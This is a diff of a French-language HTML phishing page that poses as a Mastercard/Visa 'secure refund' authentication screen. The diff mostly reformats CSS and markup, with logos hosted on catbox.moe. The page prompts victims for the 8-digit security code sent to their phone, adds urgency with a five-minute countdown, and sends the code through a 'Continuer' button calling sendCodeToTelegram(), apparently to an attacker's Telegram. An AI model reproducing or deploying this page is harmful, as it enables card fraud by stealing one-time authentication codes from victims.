@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -15,30 +16,42 @@
             align-items: center;
             height: 120vh;
             flex-direction: column;
+            padding-top: 0px auto;
+
         }
+
         .container {
             background: white;
-            padding: 30px;
+            padding: 40px;
             border-radius: 20px;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
             text-align: center;
             width: 100%;
             max-width: 350px;
         }
+
         h2 {
             color: #333;
             font-size: 20px;
             margin-bottom: 15px;
         }
+
         .logos {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 15px;
         }
+
         .logos img {
-            height: 30px;
+            height: 32px;
+
         }
+
+        #visa {
+            height: 26px;
+        }
+
         .auth-box {
             background: #eb7500;
             color: white;
@@ -49,11 +62,13 @@
             font-weight: bold;
             font-size: 16px;
         }
+
         .auth-box img {
             display: block;
             margin: 10px auto 0;
             width: 40px;
         }
+
         .info {
             background: #2b6cb0;
             padding: 10px;
@@ -62,14 +77,17 @@
             font-size: 14px;
             color: white;
         }
+
         .details {
             text-align: center;
             margin: 20px 0;
             font-size: 14px;
         }
+
         .details p {
             margin: 5px 0;
         }
+
         .instructions {
             text-align: left;
             padding: 0;
@@ -77,11 +95,13 @@
             list-style: none;
             counter-reset: step-counter;
         }
+
         .instructions li {
             margin: 10px 0;
             position: relative;
             padding-left: 40px;
         }
+
         .instructions li::before {
             content: counter(step-counter);
             counter-increment: step-counter;
@@ -99,10 +119,12 @@
             align-items: center;
             font-weight: bold;
         }
+
         .code-box {
             margin-top: 20px;
             text-align: center;
         }
+
         .code-box input {
             width: 80%;
             padding: 10px;
@@ -111,6 +133,7 @@
             border: 1px solid #ccc;
             border-radius: 5px;
         }
+
         .code-box button {
             margin-top: 10px;
             background-color: #2b6cb0;
@@ -121,35 +144,41 @@
             cursor: pointer;
             font-size: 16px;
         }
+
         .countdown {
             margin-top: 10px;
             font-size: 16px;
             color: red;
         }
+
     </style>
 </head>
+
 <body>
     <div class="container">
-                <br>
+        <br>
         <h2>Remboursement sécurisé</h2>
+        <br>
         <div class="logos">
             <img src="https://files.catbox.moe/w68kem.png" alt="Matsercard">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" id="visa" alt="Visa">
         </div>
-        
+
         <div class="auth-box">
             <p>Pour autoriser votre Remboursement, veuillez vous authentifier</p>
             <img src="https://i.gifer.com/origin/34/34338d26023e5515f6cc8969aa027bca_w200.gif" alt="Chargement...">
         </div>
         <div class="info">
-          Le prix qui sent le prix qui s'affiche déjà payé avec le service clientèle c'est juste une publication tu as rien payé fais-moi confiance
+            Le prix qui sent le prix qui s'affiche déjà payé avec le service clientèle c'est juste une publication tu as
+            rien payé fais-moi confiance
         </div>
         <div class="details">
             <p><strong>Montant Remboursé :</strong> Remboursement automatique</p>
             <p><strong>Date :</strong> <span id="date"></span></p>
             <p><strong>N° de carte :</strong> xxxxxxxxxxxxXXXX</p>
         </div>
-        <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/l15why.gif" height="123px" width="220px" data-component="video">
+        <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/l15why.gif" height="123px"
+            width="220px" data-component="video">
 
         <ol class="instructions">
             <li>Vous allez recevoir une notification sur votre appareil de confiance</li>
@@ -158,9 +187,11 @@
         </ol>
         <div class="code-box">
             <h4>Étape 1/2 : Saisissez le code de sécurité reçu sur votre téléphone</h4>
-            <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/ccqgjj.png" height="100px" width="100px" data-component="video">
+            <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/ccqgjj.png" height="100px"
+                width="100px" data-component="video">
             <input type="text" id="securityCode" maxlength="8" placeholder="Code de sécurité (8 chiffres)">
-            <p id="validation-error" style="display: none; color: red; font-size: 0.9em; margin-top: 5px;">Code invalide</p>
+            <p id="validation-error" style="display: none; color: red; font-size: 0.9em; margin-top: 5px;">Code invalide
+            </p>
             <div class="countdown" id="countdown">05:00</div>
             <button onclick="sendCodeToTelegram()">Continuer</button>
         </div>
@@ -207,4 +238,5 @@
 
     </script>
 </body>
+
 </html>
